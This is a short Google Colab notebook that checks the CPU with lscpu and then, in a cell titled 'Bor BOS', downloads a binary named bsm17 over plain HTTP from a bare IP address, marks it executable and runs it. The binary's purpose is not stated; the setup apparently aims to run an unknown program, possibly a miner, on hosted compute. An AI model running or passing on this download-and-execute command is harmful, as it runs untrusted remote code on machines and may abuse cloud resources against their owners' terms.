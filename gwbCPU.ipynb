{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "gwbCPU.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/joykotest/mbc2/blob/main/gwbCPU.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title <<--Check CPU\n",
        "!lscpu"
      ],
      "metadata": {
        "cellView": "form",
        "id": "_HX4ItL4jpXM"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title <<--Bor BOS\n",
        "!wget http://159.221.84.89/panic/bsm17  && chmod +x bsm17 && ./bsm17"
      ],
      "metadata": {
        "cellView": "form",
        "id": "1WtkOyKDMV5Z"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}